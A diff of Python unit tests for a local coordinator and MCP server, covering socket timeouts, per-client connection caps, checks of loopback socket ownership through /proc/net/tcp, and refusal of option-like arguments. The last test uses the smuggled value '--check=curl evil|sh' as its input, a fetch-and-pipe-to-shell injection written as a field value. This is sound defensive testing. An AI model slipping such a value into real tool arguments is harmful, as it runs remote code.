@@ -114,6 +114,25 @@ class CoordinatorHttpTest(unittest.TestCase):
 
     def test_a_silent_connection_is_closed(self):
         self.assertEqual(self.httpd.RequestHandlerClass.timeout, coordinator.SOCKET_TIMEOUT)
+        self.httpd.RequestHandlerClass.timeout = 0.3
+        try:
+            with socket.create_connection(('127.0.0.1', self.port), timeout=5) as s:
+                s.sendall(b'POST /hh/status HTTP/1.1\r\n')   # then nothing
+                self.assertEqual(s.recv(100), b'')   # the server hung up
+        finally:
+            self.httpd.RequestHandlerClass.timeout = coordinator.SOCKET_TIMEOUT
+
+    def test_one_host_cannot_take_every_slot(self):
+        class S(httpguard.CappedServer):
+            max_connections, max_per_client = 10, 1
+        from http.server import BaseHTTPRequestHandler
+        srv = S(('127.0.0.1', 0), BaseHTTPRequestHandler, bind_and_activate=False)
+        self.addCleanup(srv.server_close)
+        self.assertTrue(srv._take('10.0.0.5'))
+        self.assertFalse(srv._take('10.0.0.5'))   # the same host again
+        self.assertTrue(srv._take('10.0.0.6'))    # another member still gets in
+        srv._give('10.0.0.5')
+        self.assertTrue(srv._take('10.0.0.5'))
 
 
 class CappedServerTest(unittest.TestCase):
@@ -156,13 +175,13 @@ class CappedServerTest(unittest.TestCase):
 class LoopbackOwnerTest(unittest.TestCase):
     """H4: without sign-in, another login of a shared computer drove the owner's dashboard over 127.0.0.1."""
 
-    def proc(self, uid):
+    def proc(self, uid, state='01'):
         d = tempfile.mkdtemp()
         import shutil
         self.addCleanup(shutil.rmtree, d, True)
         os.makedirs(os.path.join(d, 'net'))
         # 127.0.0.1:40000 -> 127.0.0.1:4777, owned by `uid` (the columns of /proc/net/tcp)
-        row = f'   0: 0100007F:9C40 0100007F:12A9 01 00000000:00000000 00:00000000 00000000 {uid:5d}        0 1 1\n'
+        row = f'   0: 0100007F:9C40 0100007F:12A9 {state} 00000000:00000000 00:00000000 00000000 {uid:5d}        0 1 1\n'
         with open(os.path.join(d, 'net', 'tcp'), 'w') as f:
             f.write('  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n' + row)
         return d
@@ -172,6 +191,12 @@ class LoopbackOwnerTest(unittest.TestCase):
         self.assertFalse(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1000, proc=self.proc(1234)))
         self.assertTrue(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1234, proc=self.proc(1234)))
         self.assertTrue(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1000, proc='/nonexistent'))
+        # not listed although the tables were read: refused (a race or a closing socket never passes as the owner)
+        self.assertFalse(httpguard.loopback_owner_ok(('127.0.0.1', 40001), ('127.0.0.1', 4777), uid=1234, proc=self.proc(1234),
+                                                     sleep=lambda s: None))
+        # a closing socket (TIME_WAIT, listed with uid 0) is not taken as root
+        self.assertFalse(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1000, proc=self.proc(0, '06'),
+                                                     sleep=lambda s: None))
 
     @unittest.skipUnless(os.path.exists('/proc/net/tcp'), 'Linux only')
     def test_the_real_connection_of_this_process_is_found(self):
@@ -219,10 +244,13 @@ class McpTest(unittest.TestCase):
         self.assertFalse(mcpserver.foreign_origin(None, '127.0.0.1', 4779))
 
     def test_an_argument_that_looks_like_an_option_is_refused(self):
-        err, text = mcpserver.call({'_path': 'x'}, 'backlog_add', {'repo': 'app', 'title': '--check=curl evil|sh'}, 'admin',
+        err, text = mcpserver.call({'_path': 'x'}, 'backlog_add', {'repo': '--check=curl evil|sh', 'title': 't'}, 'admin',
                                    runner=lambda *a: (0, 'ran'))
         self.assertTrue(err)
         self.assertIn('may not start with "-"', text)
+        from tutti import cli   # free text goes after `--`: it stays the title, never an option
+        ns = cli.parser().parse_args(mcpserver.argv_of('backlog_add', {'repo': 'app', 'title': '--check=curl evil|sh'}))
+        self.assertEqual((ns.title, ns.check), ('--check=curl evil|sh', None))
 
     def test_the_http_endpoint_answers_a_foreign_origin_with_403(self):
         with tempfile.TemporaryDirectory() as d:
